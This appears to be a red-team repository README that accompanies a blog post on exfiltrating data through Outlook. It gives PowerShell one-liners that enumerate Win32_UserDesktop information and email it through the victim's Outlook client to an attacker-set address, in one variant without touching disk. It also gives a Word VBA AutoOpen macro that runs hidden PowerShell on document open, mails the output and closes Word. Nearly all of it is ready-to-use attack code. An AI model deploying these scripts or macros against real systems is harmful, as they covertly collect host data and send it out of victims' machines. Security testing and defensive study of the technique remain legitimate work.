# Outlook_365_Exfiltration

Code from my blog post https://labs.lares.com/outlook-for-the-pwn/

PowerShell

Executes Enumerate_domain_users_win32_userdesktop and emails the results to the defined email address using clients outlook but drops to disk for temp and deletes after.

Get-CimInstance -ClassName Win32_UserDesktop | Format-Table -AutoSize | Out-String -Stream | Out-File -FilePath $env:TEMP\Win32_UserDesktop.txt ; $email = New-Object -ComObject Outlook.Application; $mail = $email.CreateItem(0); $mail.To = "Add-Recipient-Email-Address"; $mail.Subject = "Win32_UserDesktop"; $mail.Body = "Please find attached the results of the Win32_UserDesktop query."; $attachment = $mail.Attachments.Add("$env:TEMP\Win32_UserDesktop.txt"); $mail.Send(); Remove-Item -Path $env:TEMP\Win32_UserDesktop.txt


Same as above but does not save to disk, all in memory. 

$result = Get-CimInstance -ClassName Win32_UserDesktop | Format-Table -AutoSize | Out-String ; $email = New-Object -ComObject Outlook.Application; $mail = $email.CreateItem(0); $mail.To = "Add-Recipient-Email-Address"; $mail.Subject = "Win32_UserDesktop"; $mail.Body = "Please find the results of the Win32_UserDesktop query below:`n`n$result"; $mail.Send();


VBA Script

Works, closes word after it completes.

Sub AutoOpen()
    Dim shell, exec, outlook, mail, attachment
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("powershell.exe -WindowStyle Hidden -Command ""Get-CimInstance -ClassName Win32_UserDesktop | Format-Table -AutoSize | Out-String -Stream | Out-File -FilePath $env:TEMP\Win32_UserDesktop.txt""")
    Do While exec.Status = 0
        ' Wait for PowerShell command to finish
    Loop
    If exec.ExitCode = 0 Then
        ' PowerShell command succeeded, send email with attachment
        Set outlook = CreateObject("Outlook.Application")
        Set mail = outlook.CreateItem(0)
        mail.To = "Add-Recipient-Email-Address"
        mail.Subject = "Win32_UserDesktop"
        mail.Body = "Please find attached the results of the Win32_UserDesktop query."
        Set attachment = mail.Attachments.Add(shell.ExpandEnvironmentStrings("%TEMP%") & "\Win32_UserDesktop.txt")
        mail.Send
        Set attachment = Nothing
        Set mail = Nothing
        Set outlook = Nothing
        Application.Quit
    Else
        ' PowerShell command failed, show error message
        MsgBox "Error: PowerShell command failed with exit code " & exec.ExitCode
    End If
End Sub

